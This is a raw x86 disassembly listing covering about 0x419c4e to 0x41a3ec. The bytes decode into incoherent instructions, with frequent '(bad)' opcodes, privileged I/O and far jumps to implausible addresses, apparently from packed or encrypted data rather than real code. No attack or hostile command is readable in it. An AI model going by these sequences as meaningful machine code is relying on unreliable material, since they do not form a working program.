  419c4e:	push   eax
  419c4f:	or     BYTE PTR [eax-0x2a],bl
  419c52:	fs aaa 
  419c54:	leave  
  419c55:	jbe    0x419c44
  419c57:	mov    cl,0x55
  419c59:	and    al,0x27
  419c5b:	call   0x2dc9ff92
  419c60:	xchg   esi,eax
  419c61:	mov    ebp,0x4daea21
  419c66:	sub    DWORD PTR [ecx+ebx*4-0x2e97cde2],ebx
  419c6d:	xor    cl,BYTE PTR [eax-0x5]
  419c70:	or     DWORD PTR [edx+edx*2-0x4a],esp
  419c74:	push   ds
  419c75:	add    al,0x81
  419c77:	data16 or dh,BYTE PTR [ecx-0x66bd1c7e]
  419c7e:	sbb    eax,DWORD PTR [ecx]
  419c80:	(bad)  
  419c81:	mov    ecx,0x56308a38
  419c86:	aaa    
  419c87:	(bad)  [ecx+0x43cba9bf]
  419c8d:	mov    ebp,0xe6c50825
  419c92:	sub    DWORD PTR [edi],ecx
  419c94:	push   ds
  419c95:	sar    DWORD PTR [ebx+ebx*1-0x52ddf1f8],0x6c
  419c9d:	mov    ?,ecx
  419c9f:	mov    edx,0x8c0068f0
  419ca4:	push   ebx
  419ca5:	jo     0x419ca7
  419ca7:	cmc    
  419ca8:	jmp    0x9b18:0x96937c7b
  419caf:	mov    dh,0x6e
  419cb1:	xor    edi,esp
  419cb3:	jge    0x419d22
  419cb5:	(bad)  
  419cb6:	push   esi
  419cb7:	mov    ch,ch
  419cb9:	xor    al,0x12
  419cbb:	lods   eax,DWORD PTR ds:[esi]
  419cbc:	jno    0x419cff
  419cbe:	pop    es
  419cbf:	xchg   BYTE PTR [esp+esi*2+0x49],al
  419cc3:	dec    esi
  419cc4:	cmc    
  419cc5:	aam    0x64
  419cc7:	dec    esi
  419cc8:	int3   
  419cc9:	inc    ecx
  419cca:	in     eax,dx
  419ccb:	and    al,0xab
  419ccd:	sti    
  419cce:	push   ss
  419ccf:	mov    cl,ah
  419cd1:	and    al,0x37
  419cd3:	pop    ebx
  419cd4:	push   ds
  419cd5:	and    ecx,ebx
  419cd7:	fwait
  419cd8:	icebp  
  419cd9:	mov    WORD PTR [ecx+0x27],es
  419cdc:	jb     0x419d40
  419cde:	(bad)  
  419cdf:	call   0x6069:0xc26c2c
  419ce6:	push   edx
  419ce7:	clc    
  419ce8:	or     eax,0x2d0ff707
  419ced:	add    DWORD PTR ds:0xbf596c11,eax
  419cf3:	icebp  
  419cf4:	and    BYTE PTR [esi+0x11430644],dl
  419cfa:	dec    edi
  419cfb:	into   
  419cfc:	retf   0x3283
  419cff:	(bad)  [edi+esi*4+0x3396dd1d]
  419d06:	xchg   ecx,eax
  419d07:	push   ebx
  419d08:	data16 into 
  419d0a:	mov    esi,0x15bd7ee1
  419d0f:	cmp    DWORD PTR [ebp+0x4d],edx
  419d12:	inc    edi
  419d13:	dec    esi
  419d14:	cli    
  419d15:	hlt    
  419d16:	shr    BYTE PTR [ecx+0x3085f02c],0x8b
  419d1d:	jne    0x419d54
  419d1f:	mov    ?,WORD PTR [eax]
  419d21:	rcr    bl,0xfd
  419d24:	imul   eax,DWORD PTR [eax-0xf],0x14
  419d28:	popa   
  419d29:	neg    BYTE PTR [esi]
  419d2b:	out    0x87,eax
  419d2d:	push   ss
  419d2e:	jg     0x419d90
  419d30:	(bad)  
  419d31:	outs   dx,BYTE PTR ds:[esi]
  419d32:	adc    BYTE PTR [edx*1-0x3c6e6ff6],bh
  419d39:	leave  
  419d3a:	add    ebp,0xffffffb6
  419d3d:	fcomi  st,st(1)
  419d3f:	xor    BYTE PTR [eax+0x7c97a34a],cl
  419d45:	aad    0x92
  419d47:	push   0x36
  419d49:	test   eax,0x623a353f
  419d4e:	sbb    eax,0x5f0b5e29
  419d53:	cwde   
  419d54:	inc    BYTE PTR [esi-0x4119e7e5]
  419d5a:	daa    
  419d5b:	jge    0x419d91
  419d5d:	loope  0x419d20
  419d5f:	mov    al,0x78
  419d61:	inc    ebp
  419d62:	mov    esi,0xee174108
  419d67:	inc    esi
  419d68:	arpl   WORD PTR [esi+0x69ed511a],di
  419d6e:	add    eax,0x538773ba
  419d73:	or     ebp,edx
  419d75:	mov    dl,BYTE PTR [ecx]
  419d77:	xor    BYTE PTR [ebp-0x4cf7673e],bl
  419d7d:	mov    eax,ds:0x2a7d373a
  419d82:	loopne 0x419df5
  419d84:	sbb    DWORD PTR [ebp-0x7b],esp
  419d87:	xor    al,0xb4
  419d89:	mov    ds:0xd131d72,eax
  419d8e:	add    BYTE PTR [esi-0x5b0fb2af],al
  419d94:	je     0x419e04
  419d96:	jo     0x419dfc
  419d98:	mov    ebx,0x44be3f91
  419d9d:	sub    al,0xdc
  419d9f:	push   eax
  419da0:	sbb    ch,bl
  419da2:	loope  0x419d96
  419da4:	aam    0x92
  419da6:	sahf   
  419da7:	mov    cl,0x57
  419da9:	add    eax,0xa741979
  419dae:	jb     0x419db1
  419db0:	jmp    0xad588368
  419db5:	dec    esi
  419db6:	repz mov eax,ds:0xd57d83d5
  419dbc:	div    DWORD PTR [edx-0x583d9248]
  419dc2:	fist   DWORD PTR [eax-0x190039b4]
  419dc8:	popf   
  419dc9:	mov    esi,0x55d614b7
  419dce:	loop   0x419de1
  419dd0:	popf   
  419dd1:	sbb    BYTE PTR [eax-0xe02cd9c],bh
  419dd7:	mov    dh,0x58
  419dd9:	pop    ds
  419dda:	fsubr  DWORD PTR [ecx+eiz*8+0x41]
  419dde:	rcl    eax,0x56
  419de1:	jnp    0x419d96
  419de3:	dec    esp
  419de4:	jge    0x419e57
  419de6:	gs jecxz 0x419d9a
  419de9:	xchg   ebp,eax
  419dea:	shl    BYTE PTR [ebp+0x5c],1
  419ded:	cmp    BYTE PTR [edx],ah
  419def:	shl    edi,cl
  419df1:	test   eax,0xf54c7da8
  419df6:	and    al,0xb0
  419df8:	mov    BYTE PTR [edx],bh
  419dfa:	jmp    0x8135d922
  419dff:	sub    al,0xe0
  419e01:	ss adc eax,0x7f9e27fe
  419e07:	sub    BYTE PTR [ecx+0x41],0xfa
  419e0b:	ds sub ecx,eax
  419e0e:	rcr    DWORD PTR [ebp+0x65494ae8],0xbf
  419e15:	inc    esi
  419e16:	dec    eax
  419e17:	sbb    ch,BYTE PTR [edi-0x7fe82d49]
  419e1d:	jns    0x419db9
  419e1f:	push   0xffffffe6
  419e21:	push   ecx
  419e22:	lock dec ebp
  419e24:	or     DWORD PTR [ebx+0x1b],0xa9ad5d44
  419e2b:	sbb    DWORD PTR [ecx+0x51],eax
  419e2e:	xchg   esi,eax
  419e2f:	sub    al,0x19
  419e31:	int3   
  419e32:	adc    BYTE PTR [edx],bl
  419e34:	add    eax,0xcf90521f
  419e39:	rcl    BYTE PTR [edx+eax*1],cl
  419e3c:	adc    bl,ch
  419e3e:	(bad)  
  419e40:	jo     0x419e34
  419e42:	pop    eax
  419e43:	rcr    DWORD PTR [ebp+0x25],cl
  419e46:	iret   
  419e47:	scas   eax,DWORD PTR es:[edi]
  419e48:	mov    ebx,0xd333d448
  419e4d:	loopne 0x419e63
  419e4f:	jae    0x419ec1
  419e51:	push   ebp
  419e52:	std    
  419e53:	and    eax,0x98b7c85b
  419e58:	rol    BYTE PTR [ebp+0x9],1
  419e5b:	jmp    0x2794:0xa6cbf08d
  419e62:	retf   
  419e63:	dec    esp
  419e64:	or     al,0x1d
  419e66:	scas   eax,DWORD PTR es:[edi]
  419e67:	or     dl,BYTE PTR [ebp+0x6258ea6f]
  419e6d:	mov    ds:0xa96cb59f,al
  419e72:	cmp    eax,0xd79c7df6
  419e77:	or     al,al
  419e79:	adc    al,0xc2
  419e7b:	sbb    eax,0xbcf9b62e
  419e80:	pop    ds
  419e81:	enter  0x3cc1,0xa5
  419e85:	jg     0x419e19
  419e87:	lds    ecx,FWORD PTR [ecx+0x1587e941]
  419e8d:	aas    
  419e8e:	repz into 
  419e90:	dec    ebp
  419e91:	sahf   
  419e92:	mov    esi,0x836a97e5
  419e97:	pop    ebp
  419e98:	icebp  
  419e99:	inc    eax
  419e9a:	in     al,0xfc
  419e9c:	adc    dh,BYTE PTR [esi+esi*4-0x68]
  419ea0:	ja     0x419eef
  419ea2:	hlt    
  419ea3:	push   ebx
  419ea4:	mov    bh,0x33
  419ea6:	jmp    0x75ea:0xa353f290
  419ead:	ins    BYTE PTR es:[edi],dx
  419eae:	mov    edi,0x96e65e00
  419eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eb4:	pop    esi
  419eb5:	push   eax
  419eb6:	call   FWORD PTR [edx-0x60]
  419eb9:	fisub  WORD PTR fs:0x5bb22edd
  419ec0:	fsubp  st(4),st
  419ec2:	inc    edx
  419ec3:	int3   
  419ec4:	out    0x4f,al
  419ec6:	ins    BYTE PTR es:[edi],dx
  419ec7:	sub    BYTE PTR [eax-0x1b1ffd9d],ch
  419ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ece:	mov    ?,esi
  419ed0:	das    
  419ed1:	inc    ecx
  419ed2:	call   0x44c50a30
  419ed7:	pusha  
  419ed8:	clc    
  419ed9:	add    esp,DWORD PTR [ebx+edx*8]
  419edc:	iret   
  419edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ede:	inc    edx
  419edf:	cmp    ecx,eax
  419ee1:	ins    BYTE PTR es:[edi],dx
  419ee2:	daa    
  419ee3:	xchg   BYTE PTR [ecx-0x22e35ef5],al
  419ee9:	test   DWORD PTR [ecx],esp
  419eeb:	retf   
  419eec:	(bad)  
  419eed:	fcom   DWORD PTR [eax]
  419eef:	pop    es
  419ef0:	dec    eax
  419ef1:	adc    BYTE PTR [eax],0x4e
  419ef4:	or     bl,BYTE PTR [edi]
  419ef6:	pusha  
  419ef7:	sbb    al,0x8c
  419ef9:	in     eax,0x5e
  419efb:	mov    eax,DWORD PTR ds:0x6ce31f79
  419f01:	mov    ebp,0x498e74f1
  419f06:	gs pusha 
  419f08:	inc    esi
  419f09:	test   eax,0x450b6164
  419f0e:	ret    
  419f0f:	mov    eax,ds:0xae0b2432
  419f14:	add    eax,0x4b0c2df2
  419f19:	scas   al,BYTE PTR es:[edi]
  419f1a:	fsubrp st(2),st
  419f1c:	mov    cl,0x3b
  419f1e:	xchg   esi,eax
  419f1f:	add    bl,BYTE PTR [edx-0x4d949a18]
  419f25:	jl     0x419eac
  419f27:	mov    ecx,0x299aa63
  419f2c:	push   ds
  419f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f2e:	mov    ch,bl
  419f30:	mov    al,0x79
  419f32:	or     al,BYTE PTR [ecx]
  419f34:	pop    edi
  419f35:	test   BYTE PTR [esi],cl
  419f37:	iret   
  419f38:	push   ds
  419f39:	xor    BYTE PTR [eax+ecx*1+0x12],al
  419f3d:	push   esi
  419f3e:	in     eax,0x2a
  419f40:	mov    BYTE PTR [edx],ah
  419f42:	sbb    al,0x49
  419f44:	sub    ah,BYTE PTR [ebp-0x3fbdbc1b]
  419f4a:	pusha  
  419f4b:	scas   eax,DWORD PTR es:[edi]
  419f4c:	pop    ebx
  419f4d:	std    
  419f4e:	adc    eax,DWORD PTR [esi+edi*2]
  419f51:	inc    esp
  419f52:	sub    DWORD PTR [eax-0xabff81d],eax
  419f58:	push   0xffffff8b
  419f5a:	test   al,0x3f
  419f5c:	or     DWORD PTR [ecx-0x149c0f76],eax
  419f62:	lds    ebx,FWORD PTR [esp+edi*4]
  419f65:	sbb    cl,dh
  419f67:	mov    ch,0x12
  419f69:	shr    ebp,1
  419f6b:	xchg   edi,eax
  419f6c:	mov    ebp,0x20ca75c4
  419f71:	fdivr  st,st(0)
  419f73:	push   esi
  419f74:	clc    
  419f75:	mov    edi,ss
  419f77:	cmp    ebp,DWORD PTR [eax]
  419f79:	cdq    
  419f7a:	pop    ss
  419f7b:	adc    eax,0x8093731b
  419f80:	(bad)  
  419f81:	retf   
  419f82:	fadd   st(5),st
  419f84:	mov    esp,0x713638da
  419f89:	mov    cl,0xa8
  419f8b:	push   ds
  419f8c:	dec    esi
  419f8d:	and    eax,0x9ddfed
  419f92:	rcr    DWORD PTR [esi+eax*4-0x30],cl
  419f96:	stc    
  419f97:	push   eax
  419f98:	push   ebp
  419f99:	adc    bh,BYTE PTR [eax-0x34]
  419f9c:	scas   al,BYTE PTR es:[edi]
  419f9d:	pop    ecx
  419f9e:	loopne 0x419f34
  419fa0:	sbb    al,0xd3
  419fa2:	sahf   
  419fa3:	pushf  
  419fa4:	push   ss
  419fa5:	sahf   
  419fa6:	out    dx,eax
  419fa7:	or     BYTE PTR [eax+0x7d26e512],0x75
  419fae:	addr16 pop esp
  419fb0:	mov    cl,0x87
  419fb2:	sbb    ch,ch
  419fb4:	rcr    BYTE PTR [ebx+0x4f],cl
  419fb7:	push   ebp
  419fb8:	jecxz  0x419f8d
  419fba:	sar    DWORD PTR [ecx-0x31],1
  419fbd:	cwde   
  419fbe:	scas   eax,DWORD PTR es:[edi]
  419fbf:	jmp    0x78836a5e
  419fc4:	lahf   
  419fc5:	(bad)  
  419fc6:	xchg   ebp,eax
  419fc7:	lods   al,BYTE PTR ds:[esi]
  419fc8:	loop   0x419f8c
  419fca:	loope  0x419fae
  419fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fcd:	(bad)  
  419fce:	push   esi
  419fcf:	cmp    eax,0xb7459c04
  419fd4:	xchg   edi,eax
  419fd5:	push   es
  419fd6:	cld    
  419fd7:	mov    ecx,0xec8899fb
  419fdc:	push   DWORD PTR [si-0x7e]
  419fe0:	mov    WORD PTR [eax-0x24a1717d],gs
  419fe6:	inc    edi
  419fe7:	inc    ebx
  419fe8:	mov    al,ah
  419fea:	xchg   ebx,eax
  419feb:	dec    esp
  419fec:	stos   DWORD PTR es:[edi],eax
  419fed:	mov    edx,0x9e017bdb
  419ff2:	into   
  419ff3:	push   cs
  419ff4:	mov    esi,0x5e7ffda2
  419ff9:	add    al,0x73
  419ffb:	inc    edx
  419ffc:	cmp    ecx,0xffffffd7
  419fff:	ins    DWORD PTR es:[edi],dx
  41a000:	xchg   esp,eax
  41a001:	lds    edx,FWORD PTR [ebx+0x5e]
  41a004:	jns    0x41a07e
  41a006:	inc    edi
  41a007:	fild   WORD PTR [edx+0x3d845ada]
  41a00d:	cmp    edi,DWORD PTR ds:0xbd50a1f8
  41a013:	test   eax,0x847d7adc
  41a018:	xchg   ecx,eax
  41a019:	outs   dx,DWORD PTR ds:[esi]
  41a01a:	repz icebp 
  41a01c:	stos   BYTE PTR es:[edi],al
  41a01d:	loope  0x41a073
  41a01f:	aam    0x18
  41a021:	aaa    
  41a022:	jbe    0x41a041
  41a024:	outs   dx,DWORD PTR ds:[esi]
  41a025:	js     0x41a087
  41a027:	pop    es
  41a028:	sahf   
  41a029:	adc    al,0x25
  41a02b:	mov    ecx,0xf9a0d857
  41a030:	into   
  41a031:	fcomp  DWORD PTR [edi]
  41a033:	sub    BYTE PTR [esi+eax*2+0x1fab86c2],0xa6
  41a03b:	sub    ah,bl
  41a03d:	and    edi,eax
  41a03f:	and    ebx,DWORD PTR [ebp+0xb]
  41a042:	aad    0x3f
  41a044:	aaa    
  41a045:	lds    esi,FWORD PTR [eax-0x9]
  41a048:	mov    ebx,0x97642b82
  41a04d:	ret    0xd203
  41a050:	cli    
  41a051:	lock int 0x8
  41a054:	das    
  41a055:	dec    eax
  41a056:	add    BYTE PTR [edx-0x28fa85e7],cl
  41a05c:	stos   BYTE PTR es:[edi],al
  41a05d:	mov    eax,0xf90feb79
  41a062:	fidivr WORD PTR [ebp-0x40]
  41a065:	mov    BYTE PTR [esi-0x59],al
  41a068:	fdivr  st,st(0)
  41a06a:	xchg   edi,eax
  41a06b:	xor    eax,0xd5cda576
  41a070:	mov    esi,DWORD PTR [edi+0x1f28a1b7]
  41a076:	jg     0x41a022
  41a078:	mov    al,0x7e
  41a07a:	pop    es
  41a07b:	les    edi,FWORD PTR [ebp+ebp*8+0x7f8a4fb1]
  41a082:	cmp    dl,BYTE PTR [eax-0x1795d9a6]
  41a088:	lahf   
  41a089:	lea    eax,[edx+0x20]
  41a08c:	fscale 
  41a08e:	neg    DWORD PTR [esi-0x14]
  41a091:	push   eax
  41a092:	inc    ebx
  41a093:	xchg   ebp,eax
  41a094:	cwde   
  41a095:	mov    WORD PTR [ecx-0x1b],fs
  41a098:	mov    eax,0x17350f22
  41a09d:	and    DWORD PTR [edx+ebx*8],edi
  41a0a0:	adc    cl,BYTE PTR [esi]
  41a0a2:	and    al,al
  41a0a4:	lock adc BYTE PTR [esp+eiz*2],dh
  41a0a8:	rcl    BYTE PTR [esi-0x1de84a19],cl
  41a0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0af:	pop    es
  41a0b0:	popa   
  41a0b1:	test   BYTE PTR [eax+edi*4-0x7f7221ef],bl
  41a0b8:	cmp    BYTE PTR [ecx-0x19],bh
  41a0bb:	(bad)  
  41a0bc:	mov    eax,0xdee95ff9
  41a0c1:	inc    esp
  41a0c2:	test   DWORD PTR [ebp+0x28],eax
  41a0c5:	jb     0x41a0d7
  41a0c7:	mov    ebx,DWORD PTR [eax-0x4f]
  41a0ca:	addr16 pop eax
  41a0cc:	adc    esp,ebx
  41a0ce:	dec    esp
  41a0cf:	rol    DWORD PTR [esi+0x2321f8dc],1
  41a0d5:	cmp    eax,0xaa28ccd
  41a0da:	and    eax,0x2ee33608
  41a0df:	inc    edi
  41a0e0:	mov    ebp,0xe9dac80b
  41a0e5:	jl     0x41a12d
  41a0e7:	add    BYTE PTR [esp+ebp*4],bl
  41a0ea:	addr16 xchg ebx,edi
  41a0ed:	cli    
  41a0ee:	mov    al,ds:0x57815011
  41a0f3:	pop    ecx
  41a0f4:	leave  
  41a0f5:	js     0x41a160
  41a0f7:	mov    cl,0x7f
  41a0f9:	clc    
  41a0fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0fb:	mov    bl,0x5
  41a0fd:	xor    dl,BYTE PTR [eax]
  41a0ff:	and    BYTE PTR [edi+0x3b5af79c],dh
  41a105:	pop    es
  41a106:	mov    edx,0xed290fb7
  41a10b:	dec    ebx
  41a10c:	std    
  41a10d:	cdq    
  41a10e:	add    al,0xf1
  41a110:	mov    bh,BYTE PTR [edx+ecx*8+0x1d1b6248]
  41a117:	ror    DWORD PTR [edx],1
  41a119:	cmp    dl,BYTE PTR [edi+0x74703ec0]
  41a11f:	call   0xd5eda514
  41a124:	push   esi
  41a125:	mov    eax,0xb159bcbf
  41a12a:	je     0x41a0bf
  41a12c:	aam    0x32
  41a12e:	sub    al,0x75
  41a131:	fdivr  DWORD PTR [ecx-0x34c09581]
  41a137:	jecxz  0x41a12a
  41a139:	push   eax
  41a13a:	push   esp
  41a13b:	mov    ebp,0x298459f1
  41a140:	cmp    eax,0x3fea380
  41a145:	or     bh,ah
  41a147:	ins    BYTE PTR es:[edi],dx
  41a148:	repz idiv edx
  41a14b:	cmp    DWORD PTR [ebp*2+0xe0c0767],edi
  41a152:	inc    esi
  41a153:	or     ch,BYTE PTR [edi]
  41a155:	mov    edi,0xf0e184f2
  41a15a:	imul   eax,DWORD PTR [esi+esi*1+0x21e61820],0x32
  41a162:	jno    0x41a1c9
  41a164:	jp     0x41a187
  41a166:	cmovne ecx,DWORD PTR [edi]
  41a169:	in     eax,0x36
  41a16b:	and    al,0x28
  41a16d:	sbb    al,0xc4
  41a16f:	push   eax
  41a170:	push   esi
  41a171:	stos   BYTE PTR es:[edi],al
  41a172:	inc    eax
  41a173:	lahf   
  41a174:	mov    bh,0x25
  41a176:	dec    edi
  41a177:	test   eax,0x98708121
  41a17c:	bound  ecx,QWORD PTR [ebx]
  41a17e:	xor    BYTE PTR cs:[edx+0x5685b248],bl
  41a185:	mov    al,0x5
  41a187:	sub    DWORD PTR [ebx-0x129e85cf],esi
  41a18d:	cmp    DWORD PTR [edi+0x6b39c062],eax
  41a193:	adc    edi,DWORD PTR [ecx+0x7e]
  41a196:	xchg   edx,eax
  41a197:	xchg   esi,eax
  41a198:	rcl    edi,cl
  41a19a:	lods   eax,DWORD PTR ds:[esi]
  41a19b:	aam    0x4d
  41a19d:	mov    ds:0x8cb679f9,eax
  41a1a2:	push   esi
  41a1a3:	scas   eax,DWORD PTR es:[edi]
  41a1a4:	cmp    eax,0xb77fcc68
  41a1a9:	int3   
  41a1aa:	jg     0x41a207
  41a1ac:	aam    0x56
  41a1ae:	in     al,0x57
  41a1b0:	rcr    BYTE PTR [eax],cl
  41a1b2:	xchg   edx,eax
  41a1b3:	mov    edx,0x6d3be251
  41a1b8:	add    DWORD PTR [edi+0x67],edi
  41a1bb:	and    DWORD PTR ds:0xeb579951,eax
  41a1c1:	pop    ss
  41a1c2:	outs   dx,DWORD PTR ds:[esi]
  41a1c3:	push   esp
  41a1c4:	cmp    ch,BYTE PTR [ebx-0x65]
  41a1c7:	adc    DWORD PTR [ebp+0x60],esp
  41a1ca:	and    dl,BYTE PTR [edi]
  41a1cc:	fistp  QWORD PTR [ebx]
  41a1ce:	xlat   BYTE PTR ds:[ebx]
  41a1cf:	mov    esp,0x58405a57
  41a1d4:	mov    esp,0x7dd468e9
  41a1d9:	adc    al,0xa6
  41a1db:	cmp    ah,ah
  41a1dd:	sbb    al,0x22
  41a1df:	or     ecx,esi
  41a1e1:	xor    eax,0x2735215c
  41a1e6:	outs   dx,BYTE PTR ds:[esi]
  41a1e7:	jb     0x41a1e8
  41a1e9:	lahf   
  41a1ea:	push   esi
  41a1eb:	push   ss
  41a1ec:	mov    esp,0x306425e1
  41a1f1:	iret   
  41a1f2:	sbb    DWORD PTR [edx-0x24bfa372],esp
  41a1f8:	add    eax,0xc6173912
  41a1fd:	push   edi
  41a1fe:	out    dx,eax
  41a1ff:	ret    
  41a200:	in     al,0x98
  41a202:	fnstcw WORD PTR [edi+eiz*8+0x17397d9c]
  41a209:	adc    DWORD PTR [edx+edi*4],ebx
  41a20c:	jmp    0xf6c4:0xe20ef421
  41a213:	or     esp,DWORD PTR [edx]
  41a215:	ror    BYTE PTR [esi],0xc
  41a218:	inc    ecx
  41a219:	lock test DWORD PTR [eax],edx
  41a21c:	sub    al,0x75
  41a21e:	dec    ebx
  41a21f:	push   es
  41a220:	mov    esp,0x295a66b2
  41a225:	dec    esi
  41a226:	ror    DWORD PTR [ebx+eiz*2],1
  41a229:	cmp    al,0xb4
  41a22b:	xor    eax,0x5a375c3c
  41a230:	retf   0xda2
  41a233:	ror    BYTE PTR [ecx-0x26],0xa5
  41a237:	jb     0x41a1f7
  41a239:	retf   
  41a23a:	ficom  WORD PTR [eax-0x75]
  41a23d:	xor    al,0x1
  41a23f:	leave  
  41a240:	fwait
  41a241:	jnp    0x41a225
  41a243:	mov    DWORD PTR [ebp+0x4],ebp
  41a246:	jge    0x41a238
  41a248:	arpl   WORD PTR [ebp+eiz*4-0x2d24d86a],dx
  41a24f:	aas    
  41a250:	test   eax,0xa4c98830
  41a255:	leave  
  41a256:	add    BYTE PTR [edx+0x673010f6],0x6e
  41a25d:	jbe    0x41a276
  41a25f:	add    BYTE PTR [eax-0x21c34c11],al
  41a265:	sub    eax,0xf4a3ad36
  41a26a:	aas    
  41a26b:	dec    esi
  41a26c:	dec    edx
  41a26d:	aaa    
  41a26e:	mov    al,0xad
  41a270:	retf   
  41a271:	or     BYTE PTR [ebp-0x29],ah
  41a274:	pop    esp
  41a275:	cmc    
  41a276:	cmp    eax,0x7e112a1a
  41a27b:	nop
  41a27c:	popa   
  41a27d:	jne    0x41a24d
  41a27f:	inc    BYTE PTR [ebp+0x25]
  41a282:	aam    0x4b
  41a284:	sub    al,0x4d
  41a286:	sub    bl,bh
  41a288:	ss push ecx
  41a28a:	adc    ecx,DWORD PTR [ecx]
  41a28c:	adc    dl,BYTE PTR [edi+0x6e1d3b81]
  41a292:	push   esi
  41a293:	sar    ah,0x74
  41a296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a297:	xchg   ebx,eax
  41a298:	add    eax,0xf6b0bcba
  41a29d:	xor    eax,0xdd7cc10f
  41a2a2:	mov    ebp,0x12ec0efd
  41a2a7:	cmp    eax,0x40f6a8e5
  41a2ac:	int    0x9d
  41a2ae:	lea    eax,[esp+ebp*4]
  41a2b1:	retf   
  41a2b2:	js     0x41a256
  41a2b4:	xchg   ebx,eax
  41a2b5:	lds    esp,FWORD PTR [eax+0x58]
  41a2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b9:	shl    DWORD PTR [ebx+0x7a54efc7],0xfa
  41a2c0:	jecxz  0x41a2d6
  41a2c2:	ror    DWORD PTR [ebx+ecx*8-0x27],cl
  41a2c6:	mov    bh,0xc0
  41a2c8:	push   eax
  41a2c9:	test   BYTE PTR [ecx],0x7e
  41a2cc:	cld    
  41a2cd:	add    eax,DWORD PTR [edx+0x6b]
  41a2d0:	pop    ecx
  41a2d1:	shl    dl,0xfa
  41a2d4:	pop    edx
  41a2d5:	test   BYTE PTR [edi],dh
  41a2d7:	mov    edx,0x35aa6cef
  41a2dc:	outs   dx,DWORD PTR ds:[esi]
  41a2dd:	lds    ebp,FWORD PTR [ecx+0x7e]
  41a2e0:	pop    ebx
  41a2e1:	ins    BYTE PTR es:[edi],dx
  41a2e2:	sub    esi,DWORD PTR [eax]
  41a2e4:	push   ebp
  41a2e5:	rcl    esp,0xcf
  41a2e8:	(bad)  
  41a2ea:	adc    BYTE PTR [edx+0x690416f7],dl
  41a2f0:	sti    
  41a2f1:	xchg   edi,eax
  41a2f2:	jne    0x41a2f0
  41a2f4:	in     eax,0xde
  41a2f6:	(bad)  [esi+0x56]
  41a2f9:	sahf   
  41a2fa:	icebp  
  41a2fb:	push   0x1c
  41a2fd:	mov    al,ds:0xe8d5dd1
  41a302:	mov    esp,0xaf4e005e
  41a307:	xchg   ebx,eax
  41a308:	dec    esp
  41a309:	push   cs
  41a30a:	int    0xe9
  41a30c:	jbe    0x41a2d9
  41a30e:	fild   WORD PTR [ecx]
  41a310:	xor    ebp,esi
  41a312:	es das 
  41a314:	pushf  
  41a315:	ret    
  41a316:	fiadd  WORD PTR [edi-0x6e1d735f]
  41a31c:	rcl    ch,0xd5
  41a31f:	dec    eax
  41a320:	loope  0x41a357
  41a322:	dec    esi
  41a323:	fucom  st(4)
  41a325:	int3   
  41a326:	pop    ss
  41a327:	sbb    al,0x4a
  41a329:	and    DWORD PTR [eax+edi*2-0x3e1cc82e],ebp
  41a330:	rcl    DWORD PTR [ecx],cl
  41a332:	aaa    
  41a333:	cli    
  41a334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a335:	sbb    ecx,DWORD PTR [ebx]
  41a337:	test   BYTE PTR [ebx],bl
  41a339:	cli    
  41a33a:	inc    ebx
  41a33b:	ret    
  41a33c:	mov    ds,WORD PTR [edx]
  41a33e:	fiadd  DWORD PTR [esp+esi*2+0x52126b46]
  41a345:	fld    DWORD PTR [ebp+0x3a]
  41a348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a349:	lock rol BYTE PTR [ecx],1
  41a34c:	mov    cl,0x1b
  41a34e:	lods   al,BYTE PTR ds:[esi]
  41a34f:	push   ds
  41a350:	sbb    eax,0x66869798
  41a355:	fs int 0x8b
  41a358:	stc    
  41a359:	rol    DWORD PTR [eax],0x62
  41a35c:	and    ebp,esp
  41a35e:	gs leave 
  41a360:	ret    0x4b22
  41a363:	push   edx
  41a364:	adc    al,0x97
  41a366:	(bad)  
  41a367:	fisttp DWORD PTR [esi]
  41a369:	ror    DWORD PTR [eax-0x2182f04e],cl
  41a36f:	pop    eax
  41a370:	xor    esi,DWORD PTR [edx+eax*1+0x6]
  41a374:	bswap  eax
  41a376:	add    al,0x84
  41a378:	adc    al,0xde
  41a37a:	xchg   esp,eax
  41a37b:	outs   dx,DWORD PTR ds:[esi]
  41a37c:	xchg   ecx,eax
  41a37d:	mov    ebp,0x43d8468f
  41a382:	pop    ecx
  41a383:	les    edx,FWORD PTR [ebx+ebp*1+0x5e010e9]
  41a38a:	ss pop eax
  41a38c:	lods   eax,DWORD PTR ds:[esi]
  41a38d:	and    bl,BYTE PTR [edx-0x7348e545]
  41a393:	std    
  41a394:	push   esp
  41a395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a396:	fisub  WORD PTR [esi+0x2b]
  41a399:	jo     0x41a3b2
  41a39b:	les    esi,FWORD PTR [ebp-0x2fac48b7]
  41a3a1:	fscale 
  41a3a3:	iret   
  41a3a4:	mov    ds:0x56882121,al
  41a3a9:	cld    
  41a3aa:	daa    
  41a3ab:	xor    DWORD PTR [edi-0x6b6ae3b8],eax
  41a3b1:	and    dl,cl
  41a3b3:	mov    BYTE PTR [ecx+0x2c],ch
  41a3b6:	scas   eax,DWORD PTR es:[edi]
  41a3b7:	pop    ecx
  41a3b8:	ins    DWORD PTR es:[edi],dx
  41a3b9:	jo     0x41a374
  41a3bb:	xor    DWORD PTR [ecx+0x774eca12],edi
  41a3c1:	pop    edx
  41a3c2:	push   cs
  41a3c3:	call   0xdf5:0xcdd0d75a
  41a3ca:	jp     0x41a362
  41a3cc:	jp     0x41a35e
  41a3ce:	fld    QWORD PTR [eax+edi*8+0x53e98fc9]
  41a3d5:	push   ebp
  41a3d6:	sub    ebp,esp
  41a3d8:	mov    ah,0xba
  41a3da:	xchg   esp,eax
  41a3db:	add    dl,BYTE PTR [ecx]
  41a3dd:	sub    BYTE PTR [ebp-0x6d],bh
  41a3e0:	sub    ebp,ecx
  41a3e2:	xchg   esi,eax
  41a3e3:	ret    0xc4e9
  41a3e6:	mov    edi,0xc3540ca8
  41a3eb:	outs   dx,BYTE PTR ds:[esi]
  41a3ec:	out    0xc,al
